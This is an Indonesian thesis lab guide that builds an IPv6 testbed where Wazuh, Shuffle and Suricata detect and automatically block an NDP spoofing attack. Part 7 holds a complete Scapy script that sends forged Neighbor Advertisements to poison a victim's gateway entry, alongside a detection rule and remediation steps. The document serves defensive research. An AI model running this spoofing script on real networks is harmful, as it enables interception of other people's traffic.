# 📄 Dokumentasi Lengkap Infrastruktur Lab Skripsi

## Rancang Bangun Sistem Otomatisasi Remediasi dengan Integrasi Wazuh SIEM dan Shuffle SOAR dengan Implementasi IPv6

---

### 📌 Pendahuluan

Dokumen ini mencatat seluruh langkah yang dilakukan dalam membangun infrastruktur laboratorium untuk penelitian skripsi. Infrastruktur terdiri dari:

1. **Host System**: Ubuntu 24.04 LTS
2. **Hypervisor**: QEMU/KVM untuk virtualisasi
3. **SIEM**: Wazuh (berjalan di Docker)
4. **SOAR**: Shuffle (berjalan di Docker)
5. **Attacker VM**: Kali Linux (KVM)
6. **Victim VM**: Ubuntu Server 24.04 (KVM)
7. **NIDS**: Suricata (berjalan di Host)

**Topologi Jaringan:**

| Komponen | IPv6 Address | Interface | Peran |
|----------|-------------|-----------|--------|
| Gateway KVM | fd00:1111:2222:3333::1/64 | virbr0/virbr1 | Default Gateway |
| Ubuntu Host | fd00:1111:2222:3333::1/64 | virbr1 | Gateway + Suricata |
| Kali Attacker | fd00:1111:2222:3333::200/64 | eth0 | Sumber Serangan |
| Ubuntu Victim | fd00:1111:2222:3333::100/64 | ens3 | Target Serangan |

---

## 📦 Part 1: Persiapan Host System (Ubuntu 24.04)

### 1.1 Update Sistem dan Install Paket Dasar

```bash
# Update sistem
sudo apt update && sudo apt upgrade -y

# Install paket dasar
sudo apt install -y \
  curl wget git htop net-tools unzip build-essential \
  apt-transport-https ca-certificates \
  ttf-mscorefonts-installer ubuntu-restricted-extras \
  tlp tlp-rdw

# Enable dan start TLP (power management)
sudo systemctl enable tlp
sudo systemctl start tlp
```

**Penjelasan:**
- `ttf-mscorefonts-installer`: Font Microsoft untuk kompatibilitas
- `tlp`: Power management untuk laptop
- `build-essential`: Tools kompilasi (gcc, make, dll.)

### 1.2 Install Sublime Text (Optional - Editor)

```bash
# Tambahkan GPG key Sublime Text
wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | \
  sudo gpg --dearmor -o /usr/share/keyrings/sublimehq-archive-keyring.gpg

# Tambahkan repository
echo "deb [signed-by=/usr/share/keyrings/sublimehq-archive-keyring.gpg] \
  https://download.sublimetext.com/ apt/stable/" | \
  sudo tee /etc/apt/sources.list.d/sublime-text.list

# Install
sudo apt update
sudo apt install -y sublime-text
```

---

## 🐳 Part 2: Instalasi Docker dan Wazuh

### 2.1 Instalasi Docker Engine

```bash
# Install dependency
sudo apt-get install -y ca-certificates curl

# Siapkan keyrings
sudo install -m 0755 -d /etc/apt/keyrings
sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg \
  -o /etc/apt/keyrings/docker.asc
sudo chmod a+r /etc/apt/keyrings/docker.asc

# Tambahkan repository Docker
echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] \
  https://download.docker.com/linux/ubuntu \
  $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | \
  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null

# Install Docker
sudo apt-get update
sudo apt-get install -y \
  docker-ce \
  docker-ce-cli \
  containerd.io \
  docker-buildx-plugin \
  docker-compose-plugin

# Tambahkan user ke group docker
sudo usermod -aG docker $USER
newgrp docker

# Verifikasi instalasi
docker run hello-world
```

### 2.2 Konfigurasi IPv6 pada Docker

```bash
# Buka konfigurasi Docker daemon
sudo nano /etc/docker/daemon.json
```

**Isi file `daemon.json`:**
```json
{
  "ipv6": true,
  "fixed-cidr-v6": "fd00:1111:2222:3333::/64"
}
```

```bash
# Restart Docker
sudo systemctl restart docker

# Verifikasi IPv6 aktif
docker info | grep -i ipv6
# Expected output: IPv6: true
```

### 2.3 Instalasi Wazuh (Docker)

```bash
# Set memory map limit untuk Elasticsearch
sudo sysctl -w vm.max_map_count=262144

# Clone repository Wazuh
git clone https://github.com/wazuh/wazuh-docker.git -b v4.8.0
cd wazuh-docker/single-node/

# Generate sertifikat
docker compose -f generate-indexer-certs.yml run --rm generator

# Jalankan Wazuh
docker compose up -d

# Verifikasi container berjalan
docker ps
```

**Verifikasi akses:**
- Wazuh Dashboard: `https://localhost:443`
- Username: `admin`
- Password: (lihat di log: `docker compose logs | grep "Password"`)

---

## 🔄 Part 3: Instalasi Shuffle SOAR

```bash
# Clone repository Shuffle
git clone https://github.com/shuffle/Shuffle
cd Shuffle

# Edit docker-compose.yml untuk integrasi jaringan
subl docker-compose.yml
```

**Modifikasi `docker-compose.yml` (tambahkan network):**
```yaml
# Di bagian bawah file, tambahkan:
networks:
  default:
    name: shuffle-network
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.0.0/16
```

**Untuk menghubungkan dengan Wazuh (opsional), tambahkan di `docker-compose.yml` pada service Shuffle:**
```yaml
services:
  shuffle-backend:
    networks:
      - default
      - wazuh-network  # Tambahkan jika ingin satu jaringan dengan Wazuh

networks:
  wazuh-network:
    external: true  # Asumsikan Wazuh sudah punya network
```

```bash
# Jalankan Shuffle
docker compose up -d

# Verifikasi
docker ps | grep shuffle
```

**Akses Shuffle:**
- URL: `http://localhost:3001`
- Login default: `admin@admin.com` / `admin`

---

## 🖥️ Part 4: Instalasi QEMU/KVM

### 4.1 Install KVM dan Tools

```bash
# Install KVM
sudo apt update
sudo apt install -y \
  qemu-kvm \
  libvirt-daemon-system \
  libvirt-clients \
  bridge-utils \
  virt-manager \
  virtinst \
  libguestfs-tools

# Tambahkan user ke group
sudo usermod -aG libvirt $USER
sudo usermod -aG kvm $USER
newgrp libvirt
newgrp kvm

# Verifikasi KVM
sudo virsh list --all
sudo systemctl status libvirtd
```

### 4.2 Konfigurasi Jaringan KVM IPv6

```bash
# Edit network default
EDITOR=nano sudo virsh net-edit default
```

**Tambahkan IPv6 pada `<ip>` element:**
```xml
<network>
  <name>default</name>
  <bridge name='virbr0'/>
  <ip address='192.168.122.1' netmask='255.255.255.0'>
    <dhcp>
      <range start='192.168.122.2' end='192.168.122.254'/>
    </dhcp>
  </ip>
  <!-- Tambahkan IPv6 di sini -->
  <ip family='ipv6' address='fd00:1111:2222:3333::1' prefix='64'/>
</network>
```

```bash
# Restart network
sudo virsh net-destroy default
sudo virsh net-start default
sudo virsh net-autostart default

# Verifikasi
ip -6 addr show virbr0
```

**Hasil yang diharapkan:**
```
virbr0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP
    inet6 fd00:1111:2222:3333::1/64 scope global
       valid_lft forever preferred_lft forever
```

### 4.3 (Alternatif) Buat Jaringan Isolated untuk Pengujian

```bash
# Buat file definisi network
cat > isolated-network.xml <<EOF
<network>
  <name>isolated</name>
  <bridge name='virbr1' stp='on' delay='0'/>
  <ip family='ipv6' address='fd00:1111:2222:3333::1' prefix='64'/>
</network>
EOF

# Definisikan dan aktifkan
sudo virsh net-define isolated-network.xml
sudo virsh net-start isolated
sudo virsh net-autostart isolated

# Verifikasi
sudo virsh net-list --all
ip -6 addr show virbr1
```

**Catatan:** Gunakan network `isolated` untuk mengisolasi lalu lintas KVM dari host.

---

## 🎯 Part 5: Konfigurasi Kali Attacker VM

### 5.1 Download dan Extract Image

```bash
# Download dari: https://www.kali.org/get-kali/#kali-virtual-machines
# Ekstrak ke direktori images
sudo 7z x ~/Downloads/kali-linux-*.7z -o/var/lib/libvirt/images/

# Fix permissions
sudo chown libvirt-qemu:libvirt-qemu /var/lib/libvirt/images/kali-linux-*.qcow2
sudo chmod 644 /var/lib/libvirt/images/kali-linux-*.qcow2
```

### 5.2 Import VM

```bash
sudo virt-install \
  --name kali-attacker \
  --memory 2048 \
  --vcpus 2 \
  --disk path=/var/lib/libvirt/images/kali-linux-*.qcow2,bus=virtio \
  --os-variant debian12 \
  --import \
  --network network=default,model=virtio \
  --graphics spice \
  --noautoconsole
```

**Akses VM:**
```bash
# Via GUI
sudo virt-viewer kali-attacker

# Via console
sudo virsh console kali-attacker
# Login: kali / kali
```

### 5.3 Konfigurasi IPv6 Statis di Kali

```bash
# Cek koneksi aktif
nmcli connection show

# Konfigurasi IPv6
sudo nmcli connection modify "Wired connection 1" ipv6.method manual
sudo nmcli connection modify "Wired connection 1" ipv6.addresses fd00:1111:2222:3333::200/64
sudo nmcli connection modify "Wired connection 1" ipv6.gateway fd00:1111:2222:3333::1
sudo nmcli connection modify "Wired connection 1" ipv6.dns "2001:4860:4860::8888"

# Restart koneksi
sudo nmcli connection down "Wired connection 1" && \
  sudo nmcli connection up "Wired connection 1"

# Verifikasi
ip -6 addr show
ping6 -c 4 fd00:1111:2222:3333::1
```

### 5.4 Install Tools di Kali

```bash
sudo apt update
sudo apt install -y python3-scapy tcpdump hydra net-tools

# Verifikasi Scapy
python3 -c "from scapy.all import *; print('Scapy ready')"
```

---

## 🎯 Part 6: Konfigurasi Ubuntu Victim VM

### 6.1 Install VM dengan ISO

```bash
# Buat disk image
sudo qemu-img create -f qcow2 /var/lib/libvirt/images/ubuntu-victim.qcow2 20G

# Install VM (gunakan GUI untuk kemudahan)
sudo virt-install \
  --name ubuntu-victim \
  --memory 2048 \
  --vcpus 2 \
  --disk path=/var/lib/libvirt/images/ubuntu-victim.qcow2,bus=virtio \
  --os-variant ubuntu24.04 \
  --network network=default,model=virtio \
  --graphics spice \
  --console pty,target_type=serial \
  --cdrom ~/Downloads/ubuntu-24.04-desktop.iso \
  --noautoconsole

# Akses GUI untuk instalasi
sudo virt-viewer ubuntu-victim
```

**Catatan Instalasi:**
- Buat user: `ubuntu` (atau sesuai keinginan)
- Password: catat dengan baik
- Install OpenSSH server selama instalasi

### 6.2 Konfigurasi IPv6 di Ubuntu Victim

```bash
# Login ke VM
sudo virsh console ubuntu-victim

# Edit konfigurasi Netplan
sudo nano /etc/netplan/01-netcfg.yaml
```

**Isi file:**
```yaml
network:
  version: 2
  ethernets:
    ens3:  # atau nama interface sesuai
      dhcp4: false
      dhcp6: false
      addresses:
        - fd00:1111:2222:3333::100/64
      gateway6: fd00:1111:2222:3333::1
      nameservers:
        addresses: [2001:4860:4860::8888, 2001:4860:4860::8844]
```

```bash
# Apply konfigurasi
sudo netplan apply

# Verifikasi
ip -6 addr show
ping6 -c 4 fd00:1111:2222:3333::200  # Test ke Kali
```

### 6.3 Install Tools di Ubuntu Victim

```bash
sudo apt update
sudo apt install -y iputils-ping net-tools iproute2 tcpdump
```

---

## 🔥 Part 7: Serangan NA Spoofing

### 7.1 Persiapan di Kali Attacker

```bash
# Cek interface dan MAC
ip link show eth0
# Catat MAC address (contoh: 52:54:00:74:ec:67)
ip link show eth0 | grep ether

# Verifikasi target di neighbor cache
ping6 -c 2 fd00:1111:2222:3333::100
ip -6 neigh show | grep fd00:1111:2222:3333::100
```

### 7.2 Script Serangan `na_spoof.py`

Buat file `~/Documents/na_spoof.py` di Kali:

```python
#!/usr/bin/env python3
from scapy.all import *
import time

# --- CONFIGURATION ---
VICTIM_IP = "fd00:1111:2222:3333::100"
GATEWAY_IP = "fd00:1111:2222:3333::1"
ATTACKER_MAC = "52:54:00:74:ec:67"  # Ganti dengan MAC Kali Anda
INTERFACE = "eth0"
# ---------------------

print(f"[*] Target Victim: {VICTIM_IP}")
print(f"[*] Spoofing Gateway: {GATEWAY_IP} with MAC {ATTACKER_MAC}")

na_packet = (
    IPv6(src=GATEWAY_IP, dst=VICTIM_IP) /
    ICMPv6ND_NA(tgt=GATEWAY_IP, R=1, S=0, O=1) /
    ICMPv6NDOptDstLLAddr(lladdr=ATTACKER_MAC)
)

try:
    while True:
        send(na_packet, iface=INTERFACE, verbose=False)
        print(f"[+] Sent NA spoof at {time.strftime('%H:%M:%S')}")
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[!] Stopped by user.")
```

```bash
# Set executable
chmod +x ~/Documents/na_spoof.py
```

### 7.3 Jalankan Serangan

```bash
# Di Kali
sudo python3 ~/Documents/na_spoof.py

# Di terminal lain, check NDP victim
# Dari Ubuntu Host atau VM Victim:
ip -6 neigh show | grep fd00:1111:2222:3333::1
```

**Hasil yang diharapkan:**
```
fd00:1111:2222:3333::1 dev ens3 lladdr 52:54:00:74:ec:67 REACHABLE
```
Gateway sekarang terikat ke MAC Kali Attacker.

---

## 🛡️ Part 8: Instalasi dan Konfigurasi Suricata

### 8.1 Instalasi Suricata

```bash
# Tambahkan repository Suricata
sudo add-apt-repository ppa:oisf/suricata-stable -y
sudo apt update
sudo apt install suricata -y
```

### 8.2 Konfigurasi Suricata

```bash
# Edit konfigurasi
sudo nano /etc/suricata/suricata.yaml
```

**Modifikasi untuk IPv6 dan interface `virbr1`:**
```yaml
# Pilih interface
pcap:
  interface: virbr1
  promisc: yes
  snaplen: 1518

# Aktifkan logging JSON (biasanya sudah)
outputs:
  - eve-log:
      enabled: yes
      filetype: regular
      filename: eve.json
      types:
        - alert
        - flow
```

### 8.3 Buat Custom Rule untuk NA Spoofing

```bash
sudo nano /etc/suricata/rules/local.rules
```

**Tambahkan rule:**
```
# Deteksi Neighbor Advertisement (Type 136)
# Target Gateway fd00:1111:2222:3333::1
alert icmpv6 any any -> any any (
  msg:"IPv6 NA Spoofing Attack Detected"; 
  itype:136; 
  content:"|fd 00 11 11 22 22 33 33 00 00 00 00 00 00 00 01|"; 
  offset:8; depth:16; 
  sid:1000001; 
  rev:1;
)
```

**Include rule di `suricata.yaml`:**
```bash
sudo nano /etc/suricata/suricata.yaml
# Cari "rule-files:" dan tambahkan:
rule-files:
  - local.rules
```

### 8.4 Jalankan Suricata

```bash
# Testing rule
sudo suricata -c /etc/suricata/suricata.yaml --test-rules

# Jalankan sebagai service
sudo systemctl restart suricata

# Atau manual (foreground)
sudo suricata -i virbr1 -c /etc/suricata/suricata.yaml --pcap

# Verifikasi alert
sudo tail -f /var/log/suricata/eve.json | jq 'select(.event_type=="alert")'
```

---

## 🔗 Part 9: Integrasi Wazuh dengan Suricata

### 9.1 Konfigurasi Wazuh Agent

```bash
# Edit konfigurasi Wazuh agent
sudo nano /var/ossec/etc/ossec.conf
```

**Tambahkan:**
```xml
<localfile>
  <log_format>json</log_format>
  <location>/var/log/suricata/eve.json</location>
</localfile>
```

```bash
# Restart Wazuh agent
sudo systemctl restart wazuh-agent
```

### 9.2 Integrasi Wazuh dengan Shuffle

Di Wazuh Manager container, tambahkan konfigurasi:

```bash
docker exec -it wazuh-manager bash
nano /var/ossec/etc/ossec.conf
```

**Tambahkan:**
```xml
<integration>
  <name>shuffle</name>
  <hook_url>http://shuffle-server:3001/api/v1/webhooks/your-webhook-id</hook_url>
  <level>3</level>
  <alert_format>json</alert_format>
</integration>
```

```bash
# Restart Wazuh manager
docker exec -it wazuh-manager /var/ossec/bin/wazuh-control restart
```

---

## ⚡ Part 10: Konfigurasi Shuffle SOAR Workflow

### 10.1 Buat Workflow di Shuffle

1. Login ke Shuffle dashboard (`http://localhost:3001`)
2. Buat workflow baru: `IPv6 NA Spoofing Remediation`
3. Tambahkan **Webhook** sebagai trigger
4. Copy URL webhook dan update di konfigurasi Wazuh

### 10.2 Workflow Logic

**Block 1: Parse JSON**
```
Input: $body
Output: parsed_data
```

**Block 2: Extract Attacker IP (Python Script)**
```python
import json

data = $parsed_data

# Extract src_ip from Suricata alert
try:
    src_ip = data.get("alert", {}).get("src_ip") or \
             data.get("data", {}).get("src_ip") or \
             data.get("src_ip")
    
    if src_ip and ":" in src_ip:
        output = {"attacker_ip": src_ip}
    else:
        output = {"attacker_ip": None}
except Exception as e:
    output = {"attacker_ip": None}
```

**Block 3: Execute Remediation (SSH or Command)**
```
Command: sudo ip6tables -I FORWARD -s {{attacker_ip}} -j DROP
Host: localhost (or 172.17.0.1)
User: ibrahim
Password: (set in secret)
```

---

## 🧪 Part 11: Pengujian End-to-End

### 11.1 Verifikasi Semua Komponen

```bash
# 1. Cek Wazuh
docker ps | grep wazuh

# 2. Cek Shuffle
docker ps | grep shuffle

# 3. Cek KVM
sudo virsh list --all

# 4. Cek Suricata
sudo systemctl status suricata

# 5. Cek IPv6 connectivity
# Dari Kali ke Victim
ping6 -c 4 fd00:1111:2222:3333::100
```

### 11.2 Jalankan Skenario Penuh

1. **Start Suricata**:
   ```bash
   sudo suricata -i virbr1 -c /etc/suricata/suricata.yaml --pcap
   ```

2. **Start NA Spoofing Attack** (Kali):
   ```bash
   sudo python3 ~/Documents/na_spoof.py
   ```

3. **Monitor Suricata Alert**:
   ```bash
   sudo tail -f /var/log/suricata/eve.json | jq 'select(.event_type=="alert")'
   ```

4. **Monitor Shuffle Dashboard**:
   - Buka `http://localhost:3001`
   - Cek execution workflow

5. **Verifikasi Block**:
   ```bash
   sudo ip6tables -L FORWARD -v -n | grep fd00:1111:2222:3333::200
   ```

---

## 📊 Part 12: Metrik Pengujian

### 12.1 Mean Time to Detect (MTTD)

1. Catat timestamp saat serangan dimulai:
   ```bash
   date +%s > /tmp/attack_start.txt
   ```

2. Catat timestamp saat Suricata alert di `eve.json`:
   ```bash
   sudo tail -n 1 /var/log/suricata/eve.json | jq '.timestamp'
   ```

3. Hitung selisih waktu.

### 12.2 Mean Time to Respond (MTTR)

1. Catat timestamp Suricata alert.
2. Catat timestamp saat Shuffle mengeksekusi command:
   ```bash
   docker logs shuffle-backend | grep "Executing command" | tail -1
   ```

3. Hitung selisih waktu.

### 12.3 Monitoring Resource Usage

```bash
# Monitor Docker containers
docker stats --no-stream --format "table {{.Name}}\t{{.CPUPerc}}\t{{.MemUsage}}"

# Monitor Suricata
ps aux | grep suricata
```

**Export script resource monitoring:**
```bash
#!/bin/bash
# save as: monitor_resources.sh
while true; do
  echo "=== $(date) ==="
  docker stats --no-stream --format "{{.Name}},{{.CPUPerc}},{{.MemUsage}}"
  echo ""
  sleep 10
done
```

---

## 🔧 Part 13: Troubleshooting Common Issues

### 13.1 IPv6 Route di Host Hilang

```bash
# Lihat route saat ini
ip -6 route show

# Tambahkan default route jika hilang
sudo ip -6 route add default via fe80::1 dev wlp2s0
# Ganti fe80::1 dengan gateway sesungguhnya
```

### 13.2 Suricata Tidak Deteksi Paket

```bash
# Cek apakah Suricata mendengar interface
sudo tcpdump -i virbr1 -n icmp6

# Jalankan Suricata dengan verbosity tinggi
sudo suricata -i virbr1 -c /etc/suricata/suricata.yaml --pcap -v

# Cek rule terload
sudo suricata -c /etc/suricata/suricata.yaml --dump-rules | grep 1000001
```

### 13.3 Wazuh Tidak Terima Log Suricata

```bash
# Cek log Wazuh
sudo tail -f /var/ossec/logs/ossec.log

# Cek permission file eve.json
ls -la /var/log/suricata/eve.json

# Restart Wazuh agent
sudo systemctl restart wazuh-agent
```

### 13.4 Docker IPv6 Tidak Aktif

```bash
# Cek konfigurasi daemon.json
cat /etc/docker/daemon.json

# Verifikasi
docker info | grep -i ipv6

# Restart Docker
sudo systemctl restart docker
```

---

## 📝 Part 14: Daftar Perintah yang Sering Digunakan

| Perintah | Fungsi |
|----------|--------|
| `sudo virsh list --all` | Lihat semua VM |
| `sudo virsh console <nama>` | Akses konsol VM |
| `sudo virsh start <nama>` | Start VM |
| `sudo virsh shutdown <nama>` | Shutdown VM |
| `sudo virsh undefine <nama>` | Hapus VM |
| `sudo virsh net-list --all` | Lihat semua network KVM |
| `docker ps` | Lihat container berjalan |
| `docker logs <nama>` | Lihat log container |
| `docker compose up -d` | Start semua container |
| `docker compose down` | Stop semua container |
| `ip -6 addr show` | Lihat IPv6 address |
| `ip -6 neigh show` | Lihat NDP table |
| `sudo ip6tables -L -n` | Lihat IPv6 firewall rules |
| `sudo systemctl status suricata` | Cek status Suricata |
| `sudo journalctl -u docker.service -f` | Monitor log Docker |

---

## 📚 Referensi

1. Wazuh Documentation: https://documentation.wazuh.com/
2. Shuffle SOAR: https://shuffle.run/docs/
3. Suricata User Guide: https://suricata.readthedocs.io/
4. Kali Linux: https://www.kali.org/docs/
5. Ubuntu Cloud Images: https://cloud-images.ubuntu.com/
6. Docker IPv6: https://docs.docker.com/config/daemon/ipv6/
7. Scapy Documentation: https://scapy.readthedocs.io/

---

**Dokumen ini dibuat untuk keperluan dokumentasi skripsi.**
**Terakhir diperbarui: 28 Juli 2026**

---